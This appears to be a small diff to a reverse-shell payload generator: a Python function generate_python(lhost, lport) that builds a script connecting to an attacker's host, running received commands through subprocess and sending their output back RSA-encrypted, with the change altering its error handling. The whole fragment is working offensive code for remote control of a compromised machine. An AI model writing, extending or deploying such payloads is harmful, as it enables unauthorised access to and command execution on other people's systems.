@@ -46,6 +46,7 @@ def generate():
     print('')
 
     def generate_python(lhost, lport):
+
         python_script = f'''
 import os, socket, subprocess, rsa, time;
 
@@ -80,7 +81,7 @@ while True:
             output_str = str(stdout_value, "UTF-8")
             s.send(rsa.encrypt(str.encode("\\n" + output_str + "\\n"), public_partner))
     except Exception as e:
-        time.sleep(1)
+        s.send(rsa.encrypt(str.encode("\\n"), public_partner))
         continue
 
 s.close()'''
